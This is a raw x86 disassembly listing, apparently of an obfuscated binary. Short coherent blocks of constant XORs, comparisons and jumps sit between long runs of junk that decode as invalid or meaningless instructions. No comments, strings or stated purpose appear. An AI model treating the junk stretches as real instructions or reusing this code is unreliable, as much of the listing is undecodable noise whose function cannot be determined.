  418e56:	add    BYTE PTR [edi],0xb8
  418e59:	loop   0x418e6e
  418e5b:	repnz mov eax,0xaec71e1a
  418e61:	xor    DWORD PTR [edx-0x4a],edi
  418e64:	mov    eax,ds:0x48301416
  418e69:	test   DWORD PTR [edx+0x76],esp
  418e6c:	dec    edx
  418e6d:	xor    DWORD PTR [ecx-0x235ec5],esp
  418e73:	xor    al,BYTE PTR [edi-0x5f]
  418e76:	icebp  
  418e77:	mov    esi,0x51981611
  418e7c:	sub    bh,BYTE PTR [edx+0x6bae916b]
  418e82:	imul   edx,DWORD PTR [ebp+0x48e6772c],0xffffffb4
  418e89:	test   eax,0xfc15096
  418e8e:	xor    BYTE PTR [edi+0x26a8e7f0],bh
  418e94:	xchg   BYTE PTR [edx],cl
  418e96:	xor    DWORD PTR [esi-0x1d],esp
  418e99:	stc    
  418e9a:	fsub   QWORD PTR [eax+0x7e2d313a]
  418ea0:	add    esp,DWORD PTR [ebx+0x24]
  418ea3:	out    dx,eax
  418ea4:	mov    bl,0xe0
  418ea6:	in     eax,0xc9
  418ea8:	push   0x6b
  418eaa:	inc    BYTE PTR [ebx-0x5e]
  418ead:	jne    0x418e54
  418eaf:	out    dx,eax
  418eb0:	pop    ebp
  418eb1:	fs push edi
  418eb3:	fisubr WORD PTR [ecx+0x62efe6f]
  418eb9:	pop    ds
  418eba:	inc    ecx
  418ebb:	and    bh,BYTE PTR [edx-0x31]
  418ebe:	dec    ebx
  418ebf:	mov    edx,0xcfb44fb9
  418ec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ec5:	loopne 0x418ed1
  418ec7:	shl    DWORD PTR [ebx-0x4faac48a],0x66
  418ece:	es push eax
  418ed0:	lock lea eax,[edi+eiz*2+0x79]
  418ed5:	ret    0x6a51
  418ed8:	or     al,0xb4
  418eda:	jecxz  0x418f53
  418edc:	lock cs mov esp,0x8e6f88ca
  418ee3:	jge    0x418f06
  418ee5:	dec    edi
  418ee6:	mov    edi,0x37d325fe
  418eeb:	adc    eax,0x8f85b5f6
  418ef0:	fcmove st,st(2)
  418ef2:	fdivr  QWORD PTR [eax+0x27]
  418ef5:	inc    edi
  418ef6:	xchg   edx,eax
  418ef7:	jg     0x418f06
  418ef9:	(bad)  
  418efa:	sbb    eax,0x1348aa88
  418eff:	jecxz  0x418ea2
  418f01:	dec    ebx
  418f02:	call   0x86721f49
  418f07:	mov    esi,DWORD PTR [eax+edx*1+0x45]
  418f0b:	int    0xc9
  418f0d:	pop    ebp
  418f0e:	stos   DWORD PTR es:[edi],eax
  418f0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f10:	cwde   
  418f11:	bnd jnp 0x418ef4
  418f14:	adc    bh,BYTE PTR [ecx-0x720806e8]
  418f1a:	dec    ebx
  418f1b:	xor    ebx,DWORD PTR [ecx+ecx*4-0xbd29286]
  418f22:	sub    edi,DWORD PTR [ebp-0x2c]
  418f25:	adc    al,0x92
  418f27:	xchg   ebx,eax
  418f28:	push   ebx
  418f29:	xchg   edx,eax
  418f2a:	mov    dl,0x95
  418f2c:	lods   al,BYTE PTR ds:[esi]
  418f2d:	lock jo 0x418f41
  418f30:	add    ah,cl
  418f32:	jl     0x418fa9
  418f34:	sti    
  418f35:	neg    DWORD PTR [ebx+0x23]
  418f38:	out    0x93,al
  418f3a:	xchg   esi,eax
  418f3b:	sti    
  418f3c:	aaa    
  418f3d:	in     al,0xb
  418f3f:	loop   0x418faa
  418f41:	jge    0x418fa6
  418f43:	fmul   DWORD PTR [eax]
  418f45:	stos   DWORD PTR es:[edi],eax
  418f46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f47:	sahf   
  418f48:	mov    ebx,0xb1cf0fc1
  418f4d:	sbb    esi,DWORD PTR [esi-0x27d45f02]
  418f53:	out    dx,al
  418f54:	es ja  0x418f86
  418f57:	jg     0x418ef7
  418f59:	mov    edx,0x9a5940a2
  418f5e:	in     al,0xe2
  418f60:	xchg   edi,eax
  418f61:	jne    0x418f96
  418f63:	es pusha 
  418f65:	test   DWORD PTR [eax],ecx
  418f67:	pop    eax
  418f68:	sub    edi,DWORD PTR [esi+0x61bb2462]
  418f6e:	cli    
  418f6f:	cmp    edx,DWORD PTR [ebp+0x6b]
  418f72:	ds xchg ebx,eax
  418f74:	xchg   ecx,eax
  418f75:	mov    ebp,0x9c0a7cfa
  418f7a:	ret    0x8845
  418f7d:	mov    eax,ds:0x144802e5
  418f82:	stos   DWORD PTR es:[edi],eax
  418f83:	call   0x177:0xf6674db1
  418f8a:	inc    ebx
  418f8b:	std    
  418f8c:	or     al,0xbe
  418f8e:	push   edx
  418f8f:	mov    al,0x15
  418f91:	or     dh,BYTE PTR [ecx]
  418f93:	jne    0x418f28
  418f95:	gs mov bh,0xdb
  418f98:	or     bl,BYTE PTR [edi+0x51]
  418f9b:	les    edx,FWORD PTR [eax-0x5ba1e345]
  418fa1:	outs   dx,DWORD PTR ds:[esi]
  418fa2:	mov    dh,0xee
  418fa4:	xchg   dl,dh
  418fa6:	mov    eax,ss
  418fa8:	lahf   
  418fa9:	cwde   
  418faa:	lea    esp,ds:0x394105df
  418fb1:	ss adc al,0xfd
  418fb4:	inc    ebp
  418fb5:	pushf  
  418fb6:	push   edx
  418fb7:	popf   
  418fb8:	ret    
  418fb9:	and    al,0xb1
  418fbb:	adc    BYTE PTR [ecx+edx*2+0x2b],dh
  418fbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fc0:	dec    ecx
  418fc1:	push   ecx
  418fc2:	clc    
  418fc3:	mov    ah,0x60
  418fc5:	cld    
  418fc6:	lods   al,BYTE PTR ds:[esi]
  418fc7:	sub    BYTE PTR fs:[ebp-0x33c0357d],bh
  418fce:	shl    BYTE PTR [ecx],cl
  418fd0:	test   DWORD PTR [edi+0x76],esp
  418fd3:	mov    ch,0x1c
  418fd5:	xor    esi,DWORD PTR [ebx+edi*2]
  418fd8:	and    eax,0xb324ce92
  418fdd:	sbb    ebp,esp
  418fdf:	mov    ah,0x48
  418fe1:	ins    DWORD PTR es:[edi],dx
  418fe2:	cmc    
  418fe3:	jae    0x419019
  418fe5:	ins    DWORD PTR es:[edi],dx
  418fe6:	dec    esp
  418fe7:	adc    al,0x21
  418fe9:	xor    al,cl
  418feb:	jl     0x419000
  418fed:	mov    ebx,DWORD PTR [esp+0x8c]
  418ff4:	cmp    ecx,eax
  418ff6:	jne    0x419004
  418ffc:	cmp    ebx,edx
  418ffe:	je     0x41a937
  419004:	mov    eax,DWORD PTR [esp+0x40]
  419008:	mov    edx,DWORD PTR [esp+0x18]
  41900c:	xor    ecx,ecx
  41900e:	shld   ecx,eax,0x2
  419012:	jmp    0x41926f
  419017:	retf   0xad14
  41901a:	repnz mov eax,0x983c8a74
  419020:	xchg   edx,eax
  419021:	xor    bl,ch
  419023:	add    eax,0xbc9e5e5c
  419028:	inc    eax
  41902a:	mov    esi,0xbebec235
  41902f:	aaa    
  419030:	add    al,0x47
  419032:	mov    ebp,ecx
  419034:	cmc    
  419035:	sbb    eax,ebx
  419037:	or     BYTE PTR [eax+0x58],ch
  41903a:	jo     0x419053
  41903c:	mov    dl,ah
  41903e:	jp     0x418ff3
  419040:	pushw  cs
  419042:	xor    esi,esi
  419044:	inc    ecx
  419045:	cwde   
  419046:	dec    ebx
  419047:	lock adc dl,BYTE PTR [eax-0x4a]
  41904b:	mov    esp,0x507a2863
  419050:	(bad)  
  419051:	fs jp  0x41904a
  419054:	xor    eax,0x1b43d2c7
  419059:	loope  0x418fff
  41905b:	es dec edi
  41905d:	jbe    0x419066
  41905f:	mov    WORD PTR [ecx+0x3c],?
  419062:	inc    eax
  419063:	cmp    DWORD PTR [edi],edi
  419065:	push   edx
  419066:	clc    
  419067:	mov    al,ds:0xaa9d7037
  41906c:	add    edx,edi
  41906e:	aaa    
  41906f:	xchg   ebx,eax
  419070:	pop    esp
  419071:	mov    ebp,esi
  419073:	div    DWORD PTR [esi-0x49]
  419076:	cmc    
  419077:	push   esp
  419078:	icebp  
  419079:	or     ch,BYTE PTR [ebx+ecx*2-0x4218092d]
  419080:	inc    ecx
  419081:	(bad)  
  419082:	ins    DWORD PTR es:[edi],dx
  419083:	out    dx,eax
  419084:	hlt    
  419085:	mov    dl,0xce
  419087:	cmp    bl,al
  419089:	retf   
  41908a:	sub    ecx,DWORD PTR [edi]
  41908c:	jne    0x419068
  41908e:	aad    0x7b
  419090:	int    0xb2
  419092:	xor    al,0x44
  419094:	test   BYTE PTR [ebx],bh
  419096:	pop    edx
  419097:	mov    ah,ch
  419099:	sbb    eax,esi
  41909b:	sbb    BYTE PTR [ecx],dl
  41909d:	scas   eax,DWORD PTR es:[edi]
  41909e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41909f:	test   eax,0x8b857aa3
  4190a4:	(bad)  
  4190a5:	in     al,0xba
  4190a7:	imul   eax,DWORD PTR [edx+0x19],0xffffffe2
  4190ab:	adc    BYTE PTR [edi+0x4f],bh
  4190ae:	mov    ah,0x5f
  4190b0:	out    0xb8,eax
  4190b2:	into   
  4190b3:	adc    al,0x98
  4190b5:	stc    
  4190b6:	and    edx,edi
  4190b8:	adc    DWORD PTR [ecx+eiz*1],edx
  4190bb:	out    dx,al
  4190bc:	sbb    cl,BYTE PTR [edx]
  4190be:	out    0x27,eax
  4190c0:	push   ss
  4190c1:	shl    DWORD PTR [esi-0x5d89801],cl
  4190c7:	xchg   BYTE PTR [edi-0x6822d3b],al
  4190cd:	(bad)  
  4190ce:	xor    al,0x63
  4190d0:	imul   esi,DWORD PTR [edi-0x7f8e5bb6],0xffffffa1
  4190d7:	dec    edi
  4190d8:	outs   dx,DWORD PTR ds:[esi]
  4190d9:	rcr    BYTE PTR [eax],1
  4190db:	pusha  
  4190dc:	inc    eax
  4190dd:	loope  0x4190c9
  4190df:	sbb    ecx,ebp
  4190e1:	xor    bl,BYTE PTR [ebx]
  4190e3:	loopne 0x419155
  4190e5:	iret   
  4190e6:	push   eax
  4190e7:	mov    ds:0x72595e43,al
  4190ec:	gs cwde 
  4190ee:	cwde   
  4190ef:	repz lds ecx,FWORD PTR [ebp+0x7c9f6431]
  4190f6:	into   
  4190f7:	retf   0x3b81
  4190fa:	mov    esi,0xa25a5d1d
  4190ff:	sar    DWORD PTR [ecx],1
  419101:	pop    es
  419102:	dec    ebp
  419103:	fdiv   st(1),st
  419105:	mov    bh,0xf7
  419107:	mov    cl,0x38
  419109:	mov    ds:0x5904c2b,al
  41910e:	push   ss
  41910f:	ret    
  419110:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419111:	and    eax,0xb884c247
  419116:	adc    DWORD PTR [edx-0x4b39737d],esi
  41911c:	add    ebp,DWORD PTR [ecx]
  41911e:	add    eax,DWORD PTR [ecx]
  419120:	mov    dh,0x87
  419122:	or     al,0x7a
  419124:	xchg   edx,eax
  419125:	adc    al,bl
  419127:	mov    eax,ds:0x700169c7
  41912c:	xlat   BYTE PTR ds:[ebx]
  41912d:	aaa    
  41912e:	adc    eax,0x9efc6580
  419133:	stos   DWORD PTR es:[edi],eax
  419134:	mov    edx,0xfd2c14bd
  419139:	cdq    
  41913a:	sub    eax,0xb39534de
  41913f:	lods   eax,DWORD PTR ds:[esi]
  419140:	and    ch,BYTE PTR [si+0x5b]
  419144:	imul   eax,DWORD PTR [ebx+0x35],0xffffffc0
  419148:	xor    dl,0xab
  41914b:	adc    al,0xec
  41914d:	mov    eax,0x64c13c9c
  419152:	outs   dx,DWORD PTR ds:[esi]
  419153:	and    DWORD PTR [ecx+0x6c],eax
  419156:	inc    esi
  419157:	pop    eax
  419158:	fbstp  TBYTE PTR [edi]
  41915a:	cdq    
  41915b:	sbb    ch,BYTE PTR [edx+0x5]
  41915e:	add    esp,ecx
  419160:	and    DWORD PTR [ebx+0x43],0xffffffa0
  419164:	retf   
  419165:	cli    
  419166:	cmp    DWORD PTR [ecx-0x461976d],ecx
  41916c:	sbb    al,0x76
  41916e:	or     ebp,0xffffffb0
  419171:	inc    esp
  419172:	xor    eax,0x87842c59
  419177:	int3   
  419178:	and    al,0x9a
  41917a:	xlat   BYTE PTR ds:[ebx]
  41917b:	jle    0x4191f9
  41917d:	aam    0x80
  41917f:	mov    DWORD PTR [ecx-0x38],ecx
  419182:	pop    ss
  419183:	pop    es
  419184:	mov    eax,ds:0x65cd136a
  419189:	aam    0x30
  41918b:	mov    bh,al
  41918d:	ins    BYTE PTR es:[edi],dx
  41918e:	xchg   DWORD PTR [ebx-0x6e95b458],ebx
  419194:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419195:	dec    esi
  419196:	stos   BYTE PTR es:[edi],al
  419197:	sti    
  419198:	repz jl 0x41913f
  41919b:	add    edi,ecx
  41919d:	pop    edi
  41919e:	and    al,BYTE PTR [ecx-0x3f]
  4191a1:	nop
  4191a2:	push   0x2e
  4191a4:	ins    DWORD PTR es:[edi],dx
  4191a5:	xor    DWORD PTR [edx-0x552853a4],0x5c
  4191ac:	stos   DWORD PTR es:[edi],eax
  4191ad:	mov    esi,edx
  4191af:	push   ebx
  4191b0:	cwde   
  4191b1:	push   ecx
  4191b2:	cld    
  4191b3:	and    eax,0x9d118405
  4191b8:	into   
  4191b9:	adc    edx,esi
  4191bb:	call   ebp
  4191bd:	sub    al,0x6e
  4191bf:	ins    DWORD PTR es:[edi],dx
  4191c0:	jbe    0x4191a2
  4191c2:	jmp    0x419231
  4191c4:	(bad)
  4191c7:	dec    ebx
  4191c8:	dec    edx
  4191c9:	mov    eax,ds:0x3cac3eba
  4191ce:	or     ebp,ecx
  4191d0:	and    ecx,ebx
  4191d2:	cld    
  4191d3:	shr    DWORD PTR [edi-0x141ee7d],1
  4191d9:	xchg   ebp,eax
  4191da:	mov    ch,0x24
  4191dc:	jmp    DWORD PTR [edi-0x7b]
  4191df:	mov    eax,0xd67502ec
  4191e4:	sub    al,0x76
  4191e6:	add    DWORD PTR [ecx-0x29],esi
  4191e9:	sub    ah,BYTE PTR ds:0x9956b388
  4191ef:	dec    edi
  4191f0:	packssdw mm4,QWORD PTR [esi+0x39]
  4191f4:	fwait
  4191f5:	sub    edx,DWORD PTR ds:0x4b9095bb
  4191fb:	mov    esp,0x7b3561d2
  419200:	adc    eax,0x827c6277
  419205:	mov    esi,0x696610bb
  41920a:	call   0x5b41e98f
  41920f:	pop    edi
  419210:	stos   BYTE PTR es:[edi],al
  419211:	(bad)  
  419212:	outs   dx,DWORD PTR ds:[esi]
  419213:	fstp   QWORD PTR [eax-0x20674d28]
  419219:	outs   dx,DWORD PTR ds:[esi]
  41921a:	jns    0x4191b7
  41921c:	jns    0x419249
  41921e:	add    al,0x4d
  419220:	mov    ds:0x80aa347f,eax
  419225:	xor    BYTE PTR [edx-0x37],dh
  419228:	push   0x14
  41922a:	adc    dl,cl
  41922c:	mov    eax,ds:0xacbd2b02
  419231:	and    BYTE PTR [ecx-0x6d],ah
  419234:	push   edi
  419235:	aam    0xb1
  419237:	pop    ss
  419238:	adc    DWORD PTR ds:0x637c5935,0x3e3a00d0
  419242:	sbb    dh,dl
  419244:	mov    ebp,0xf9f98e14
  419249:	lea    eax,[ecx-0x61]
  41924c:	pop    edx
  41924d:	and    ebp,edx
  41924f:	and    al,0x72
  419251:	cdq    
  419252:	(bad)  
  419253:	cmp    eax,esi
  419255:	cmc    
  419256:	pop    ss
  419257:	shl    DWORD PTR [edx],cl
  419259:	stc    
  41925a:	inc    ecx
  41925b:	sub    DWORD PTR [ebp-0x6],0xffffffca
  41925f:	inc    edi
  419260:	pushf  
  419261:	lea    esp,[ebp+0x49]
  419264:	call   0x5268bd92
  419269:	inc    ebx
  41926a:	jl     0x419209
  41926c:	fdivr  QWORD PTR [esi]
  41926e:	dec    esi
  41926f:	shl    eax,0x2
  419272:	mov    ebx,0xcb79b576
  419277:	mov    DWORD PTR [esp+0x10],edx
  41927b:	mov    edx,DWORD PTR [esp+0x1c]
  41927f:	xor    eax,ebx
  419281:	xor    ecx,esi
  419283:	mov    DWORD PTR [esp+0x14],edx
  419287:	cmp    eax,DWORD PTR [esp+0x10]
  41928b:	jne    0x419299
  419291:	cmp    ecx,edx
  419293:	je     0x41a93c
  419299:	mov    eax,DWORD PTR [esp+0x44]
  41929d:	cmp    eax,0xa5069baa
  4192a2:	je     0x4192f6
  4192a8:	mov    edx,DWORD PTR [esp+0x18]
  4192ac:	mov    eax,DWORD PTR [esp+0x1c]
  4192b0:	xor    eax,esi
  4192b2:	xor    edx,0xcb79b577
  4192b8:	shrd   edx,eax,0x2
  4192bc:	shr    eax,0x2
  4192bf:	mov    DWORD PTR [esp+0x34],eax
  4192c3:	mov    eax,DWORD PTR [esp+0x18]
  4192c7:	mov    ecx,DWORD PTR [esp+0x1c]
  4192cb:	shl    eax,0x1e
  4192ce:	xor    eax,0x80000000
  4192d3:	or     eax,DWORD PTR [esp+0x34]
  4192d7:	xor    ecx,ecx
  4192d9:	mov    DWORD PTR [esp+0x14],eax
  4192dd:	mov    eax,DWORD PTR [esp+0x60]
  4192e1:	or     ecx,edx
  4192e3:	cdq    
  4192e4:	cmp    ecx,eax
  4192e6:	jne    0x41a93c
  4192ec:	cmp    DWORD PTR [esp+0x14],edx
  4192f0:	jne    0x41a93c
  4192f6:	mov    DWORD PTR [esp+0x5c],0x422754
  4192fe:	mov    DWORD PTR [esp+0x68],0x42274c
  419306:	mov    eax,DWORD PTR [esp+0x78]
  41930a:	mov    eax,DWORD PTR [esp+0x78]
  41930e:	mov    edx,DWORD PTR [esp+0x18]
  419312:	xor    ecx,ecx
  419314:	shld   ecx,eax,0x2
  419318:	shl    eax,0x2
  41931b:	mov    DWORD PTR [esp+0x10],edx
  41931f:	mov    edx,DWORD PTR [esp+0x1c]
  419323:	xor    eax,ebx
  419325:	xor    ecx,esi
  419327:	mov    DWORD PTR [esp+0x14],edx
  41932b:	cmp    DWORD PTR [esp+0x10],eax
  41932f:	jne    0x41a5e3
  419335:	cmp    edx,ecx
  419337:	jne    0x41a5e3
  41933d:	mov    DWORD PTR [esp+0x30],0x4226dc
  419345:	mov    eax,DWORD PTR [esp+0x18]
  419349:	mov    ecx,DWORD PTR [esp+0x1c]
  41934d:	shrd   eax,ecx,0x2
  419351:	shr    ecx,0x2
  419354:	mov    ecx,DWORD PTR [esp+0x18]
  419358:	mov    edx,DWORD PTR [esp+0x1c]
  41935c:	mov    edx,DWORD PTR [esp+0x30]
  419360:	mov    edx,DWORD PTR [edx+0xc]
  419363:	mov    DWORD PTR [esp+0xc],eax
  419367:	shl    ecx,0x1e
  41936a:	mov    eax,0x32de6d5d
  41936f:	xor    DWORD PTR [esp+0xc],eax
  419373:	xor    ecx,ecx
  419375:	or     ecx,DWORD PTR [esp+0xc]
  419379:	cmp    ecx,DWORD PTR [edx]
  41937b:	jne    0x41a320
  419381:	mov    ecx,0x65c7
  419386:	mov    WORD PTR [esp+0x2c],cx
  41938b:	mov    ecx,0x6062
  419390:	mov    WORD PTR [esp+0x24],cx
  419395:	mov    ecx,0x125d
  41939a:	mov    WORD PTR [esp+0xc],cx
  41939f:	movzx  ecx,WORD PTR [esp+0xc]
  4193a4:	mov    edx,0x2d0f
  4193a9:	and    cx,dx
  4193ac:	mov    dx,WORD PTR [esp+0x24]
  4193b1:	or     cx,dx
  4193b4:	mov    dx,WORD PTR [esp+0x2c]
  4193b9:	add    cx,dx
  4193bc:	or     ecx,0x3b22
  4193c2:	mov    WORD PTR [esp+0x3c],cx
  4193c7:	mov    ecx,0x57d4
  4193cc:	mov    WORD PTR [esp+0x2c],cx
  4193d1:	mov    ecx,0x3b21
  4193d6:	mov    WORD PTR [esp+0x38],cx
  4193db:	mov    ecx,0x52fd
  4193e0:	mov    WORD PTR [esp+0x24],cx
  4193e5:	mov    ecx,0x2ce0
  4193ea:	mov    WORD PTR [esp+0xc],cx
  4193ef:	mov    cx,WORD PTR [esp+0xc]
  4193f4:	mov    dx,WORD PTR [esp+0x24]
  4193f9:	jmp    0x419656
  4193fe:	gs pop ss
  419400:	dec    BYTE PTR [eax+esi*4]
  419403:	sbb    al,0x6b
  419405:	mov    esp,0xd16889ea
  41940a:	inc    edx
  41940b:	ret    
  41940c:	fst    QWORD PTR [eax-0x413ffacd]
  419412:	xor    eax,0x8bebec2
  419417:	fld    QWORD PTR [ebp-0x3c]
  41941a:	or     BYTE PTR [eax],ch
  41941c:	xchg   ebx,eax
  41941d:	push   ss
  41941e:	into   
  41941f:	shl    edi,1
  419421:	gs push ss
  419423:	xor    ecx,ebp
  419425:	inc    esp
  419426:	pop    eax
  419427:	mov    edx,0x44f24b3b
  41942c:	in     al,0x86
  41942e:	jae    0x419473
  419430:	(bad)  {k5}{z}
  419435:	mov    ecx,0x751c91ba
  41943a:	les    eax,FWORD PTR [esi+0x3d]
  41943d:	dec    ecx
  41943e:	xchg   ebx,eax
  41943f:	xchg   ecx,eax
  419440:	test   BYTE PTR [edi],ch
  419442:	jnp    0x419421
  419444:	jmp    0x1276:0xb1aaa34c
  41944b:	aad    0x46
  41944d:	imul   edi,DWORD PTR [eax-0x6],0xe59c1f11
  419454:	sbb    eax,0xf9bb6a63
  419459:	jmp    0x41947b
  41945b:	les    esp,FWORD PTR [ecx+0x77]
  41945e:	ja     0x4194cd
  419460:	shl    DWORD PTR [edi+edx*2],0xb2
  419464:	mov    edi,0xcfe467c9
  419469:	in     al,0xfa
  41946b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41946c:	mov    ss,esi
  41946e:	sub    al,0x85
  419470:	adc    edi,esi
  419472:	fnstcw WORD PTR [ecx]
  419474:	enter  0x1143,0xe5
  419478:	mov    esi,0xb3c335c4
  41947d:	js     0x419404
  41947f:	pop    ebp
  419480:	xor    BYTE PTR [ebp+0x69],0x5e
  419484:	sahf   
  419485:	loopne 0x4194c0
  419487:	xor    cl,BYTE PTR [esi-0x80]
  41948a:	cmp    cl,BYTE PTR [edx+0x36]
  41948d:	clc    
  41948e:	daa    
  41948f:	xchg   DWORD PTR [eax],ecx
  419491:	pop    eax
  419492:	jae    0x419494
  419494:	das    
  419495:	hlt    
  419496:	pop    edx
  419497:	sbb    esi,0xb
  41949a:	push   ebp
  41949b:	inc    edx
  41949c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41949d:	call   FWORD PTR [edi+eiz*2-0x45]
  4194a1:	fsubr  QWORD PTR [eax]
  4194a3:	test   DWORD PTR [ecx-0x4b],0x38675ed3
  4194aa:	loopne 0x419470
  4194ac:	aam    0xd6
  4194ae:	sub    al,0x39
  4194b0:	pop    esi
  4194b1:	adc    al,0xa
  4194b3:	sbb    eax,0x3f047730
  4194b8:	adc    al,0xcb
  4194ba:	push   ebx
  4194bb:	or     al,0xf6
  4194bd:	idiv   DWORD PTR [edx+0x4eb7ac68]
  4194c3:	add    eax,DWORD PTR [eax]
  4194c5:	cli    
  4194c6:	xor    eax,0x34273456
  4194cb:	mov    ss,WORD PTR [edx+0x72]
  4194ce:	fcomp  QWORD PTR [edx+0x560827fb]
  4194d4:	mov    bh,0xff
  4194d6:	sbb    BYTE PTR [ecx+esi*1],al
  4194d9:	cdq    
  4194da:	enter  0xe03a,0x69
  4194de:	push   esp
  4194df:	sub    esp,DWORD PTR [ebx-0x42be8060]
  4194e5:	shl    BYTE PTR ds:0xf4c1801b,1
  4194eb:	pop    ss
  4194ec:	and    al,0xd0
  4194ee:	addr16 or eax,0xbd0b062e
  4194f4:	adc    DWORD PTR [esi-0x58eff419],esi
  4194fa:	xor    al,bh
  4194fc:	mov    cl,BYTE PTR [esi]
  4194fe:	pop    ds
  4194ff:	popf   
  419500:	mov    ebx,0x7f5668f0
  419505:	mov    esp,0x8623bd90
  41950a:	out    dx,al
  41950b:	or     BYTE PTR [edx],bl
  41950d:	mov    ebp,0x7b5b322e
  419512:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419513:	inc    ebx
  419514:	ret    
  419515:	add    dl,dh
  419517:	dec    ebp
  419518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419519:	push   0xffffffa4
  41951b:	and    cl,bl
  41951d:	test   eax,0x7532731d
  419522:	daa    
  419523:	test   BYTE PTR [ecx-0x88acf55],bl
  419529:	rcr    DWORD PTR [esp+edx*1-0x79cf8685],cl
  419530:	ja     0x419550
  419532:	je     0x419541
  419534:	stos   DWORD PTR es:[edi],eax
  419535:	inc    ebp
  419536:	aas    
  419537:	mov    bh,0xa
  419539:	out    dx,eax
  41953a:	aam    0xa4
  41953c:	rcr    BYTE PTR [eax+0x31],1
  41953f:	rep lods al,BYTE PTR ds:[esi]
  419541:	aad    0xb7
  419543:	pop    edx
  419544:	test   DWORD PTR [eax+0x3b],0x9aaa0f92
  41954b:	sub    esp,DWORD PTR [edi]
  41954d:	push   eax
  41954e:	loopne 0x419536
  419550:	cld    
  419551:	in     eax,0x4c
  419553:	push   edi
  419554:	neg    DWORD PTR [ebx+ebx*2+0x10]
  419558:	int    0x66
  41955a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41955b:	jge    0x419543
  41955d:	mov    ebp,edi
  41955f:	addr16 cld 
  419561:	retf   
  419562:	es dec ecx
  419564:	out    dx,eax
  419565:	cmc    
  419566:	pushf  
  419567:	jae    0x4195e5
  419569:	mov    edi,0x292dee6
  41956e:	(bad)  
  41956f:	add    eax,0x8f4f1060
  419574:	sbb    eax,0xae19456e
  419579:	out    dx,al
  41957a:	pop    ebx
  41957b:	pop    esi
  41957c:	xchg   edi,eax
  41957d:	daa    
  41957e:	scas   eax,DWORD PTR es:[edi]
  41957f:	pusha  
  419580:	push   ss
  419581:	and    esi,ebp
  419583:	mov    WORD PTR [edx-0x5a949f09],es
  419589:	mov    al,0xd3
  41958b:	jo     0x41954c
  41958d:	adc    edi,DWORD PTR [ecx]
  41958f:	leave  
  419590:	push   ss
  419591:	retf   
  419592:	mov    al,ds:0xb501e45e
  419597:	bound  edi,QWORD PTR [ecx-0x1b]
  41959a:	sbb    bh,BYTE PTR [edi]
  41959c:	sub    al,BYTE PTR [edx+0x77936f31]
  4195a2:	lea    esp,[esi+0x61]
  4195a5:	aad    0x1c
  4195a7:	dec    ecx
  4195a8:	inc    DWORD PTR [ecx]
  4195aa:	push   ebx
  4195ab:	mov    eax,0x67a6d96e
  4195b0:	mov    ch,0x57
  4195b2:	jae    0x4195d1
  4195b4:	ret    0xf647
  4195b7:	jbe    0x4195d2
  4195b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195ba:	pushf  
  4195bb:	leave  
  4195bc:	or     eax,0xe32d5fef
  4195c1:	and    BYTE PTR [ebp-0xd],0x3f
  4195c5:	in     eax,0x90
  4195c7:	in     eax,0x6f
  4195c9:	outs   dx,DWORD PTR ds:[esi]
  4195ca:	xor    ebp,DWORD PTR [esi]
  4195cc:	xchg   al,al
  4195ce:	out    dx,eax
  4195cf:	sbb    BYTE PTR [esi+0x7825a2c0],cl
  4195d5:	mov    al,dl
  4195d7:	add    bl,BYTE PTR [esi+0x4e]
  4195da:	inc    esi
  4195db:	sub    cl,BYTE PTR [eax]
  4195dd:	add    ecx,esp
  4195df:	mov    ebx,0x931f8d23
  4195e4:	mov    al,ds:0xce1e34f6
  4195e9:	xlat   BYTE PTR ds:[ebx]
  4195ea:	mov    eax,0x61b56b19
  4195ef:	cmp    ebp,DWORD PTR [edx]
  4195f1:	ins    BYTE PTR es:[edi],dx
  4195f2:	jnp    0x419604
  4195f4:	sub    al,BYTE PTR [ebp-0x3b]
  4195f7:	mov    edi,0xd068c349
  4195fc:	pop    eax
  4195fd:	ja     0x419673
  4195ff:	pop    ss
  419600:	out    0xb0,al
  419602:	inc    esp
  419603:	addr16 test dh,al
  419606:	(bad)  
  419607:	aam    0xff
  419609:	adc    BYTE PTR [esi+edx*4],bl
  41960c:	mov    ah,0x2
  41960e:	or     esp,esi
  419610:	mov    eax,ds:0xc51110dc
  419615:	mov    ebp,0x6a045c3e
  41961a:	lods   al,BYTE PTR ds:[esi]
  41961b:	sub    bh,BYTE PTR ds:0x52811063
  419621:	fmul   QWORD PTR [eax+0x2e78d19e]
  419627:	call   0x2a08788
  41962c:	fld    st(2)
  41962e:	scas   al,BYTE PTR es:[edi]
  41962f:	mov    esi,0x9592db5
  419634:	lock cmp BYTE PTR [edx+0x1e],ch
  419638:	mov    DWORD PTR [eax+0x17f4ff2d],esi
  41963e:	push   ds
  41963f:	(bad)  
  419641:	inc    edx
  419642:	xchg   bh,al
  419644:	retf   0x1c43
  419647:	or     al,0x55
  419649:	data16 aad 0x9d
  41964c:	in     al,0x47
  41964e:	xor    BYTE PTR [esi],dh
  419650:	mov    al,0x51
  419652:	fidivr DWORD PTR [ebx+eiz*4]
  419655:	mov    ah,BYTE PTR [esi+0xb]
  419658:	retf   0xa4ba
  41965b:	and    DWORD PTR [eax],eax
  41965d:	add    BYTE PTR [esi+0xb],ah
  419660:	retf   0x8b66
  419663:	push   esp
  419664:	and    al,0x2c
  419666:	sub    cx,dx
  419669:	mov    dx,WORD PTR [esp+0x38]
  41966e:	sub    cx,dx
  419671:	mov    dx,WORD PTR [esp+0x3c]
  419676:	cmp    dx,cx
  419679:	jbe    0x41a320
  41967f:	mov    ecx,0x5008
  419684:	jmp    0x4198e1
  419689:	xchg   ebx,eax
  41968a:	sub    al,0x3f
  41968c:	jae    0x419706
  41968e:	mov    esp,0x77bf2cb3
  419693:	jo     0x419672
  419695:	mov    ebp,0xabe39876
  41969a:	or     eax,eax
  41969c:	mov    esi,0xbebec235
  4196a1:	push   ss
  4196a2:	cwde   
